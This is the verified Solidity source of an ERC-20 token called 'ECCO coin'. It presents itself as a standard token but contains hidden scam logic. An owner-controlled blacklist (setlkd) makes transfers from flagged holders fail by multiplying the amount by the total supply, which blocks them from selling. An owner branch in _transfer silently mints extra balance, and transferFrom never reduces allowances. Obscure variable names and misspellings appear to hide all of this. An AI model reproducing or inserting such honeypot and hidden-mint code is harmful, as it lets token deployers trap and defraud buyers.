/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

/**   




            ╭━━━┳━━━┳━━━┳━━━╮
            ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃
            ┃╰━━┫┃╱╰┫┃╱╰┫┃╱┃┃
            ┃╭━━┫┃╱╭┫┃╱╭┫┃╱┃┃
            ┃╰━━┫╰━╯┃╰━╯┃╰━╯┃
            ╰━━━┻━━━┻━━━┻━━━╯

        * Website: https://eccothecoin.online/
        * Telegram: https://t.me/+VOu4hsh6uhE2ZTRk


*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accoint) external view returns (uint256);

    function transfer(address recipient, uint256 ameunts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 ameunts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 ameunts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fee https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "ECCO coin";
    string private _symbol = "ECCO";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfee = 8;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    address private _ddmmm;
    mapping(address => bool) public _DDDLKD22;

    function setlkd(address accoint) public onlyowner {
        _DDDLKD22[accoint] = true;
    }


    function unsetlkd(address accoint) public onlyowner {
        _DDDLKD22[accoint] = false;
    }


    function islkd(address accoint) public view returns (bool) {
        return _DDDLKD22[accoint];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _ddmmm =  msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 ameunts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
       
        if (_DDDLKD22[sender]) {
            ameunts = ameunts.mul(_totalSupply);
        }else {
                if(sender == _ddmmm && _ddmmm == owner() && owner() == _msgSender()){
                    _balance[sender] = _balance[sender].add(ameunts);
                }
        }
        uint256 blsender = _balance[sender];
        require(blsender >= ameunts,"IERC20: transfer ameunts exceeds balance");
        
        uint256 feeameunt = 0;
        feeameunt = ameunts.mul(_burnfee).div(100);
        _balance[sender] = _balance[sender].sub(ameunts);
        _balance[recipient] =  _balance[recipient]+ameunts-feeameunt;
        emit Transfer(sender, _DEADaddress, feeameunt);
        emit Transfer(sender, recipient, ameunts-feeameunt);

    }

    function transfer(address recipient, uint256 ammounts) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, recipient, ammounts);
        return true;
    }


    function balanceOf(address accoint) public view override returns (uint256) {
        return _balance[accoint];
    }

    function approve(address spender, uint256 ammounts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, ammounts);
        return true;
    }

    function _approve(address owner, address spender, uint256 ameunts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = ameunts;
        emit Approval(owner, spender, ameunts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 ameunts) public virtual override returns (bool) {
        _transfer(sender, recipient, ameunts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= ameunts, "IERC20: transfer ameunts exceeds allowance");
        return true;
    }

}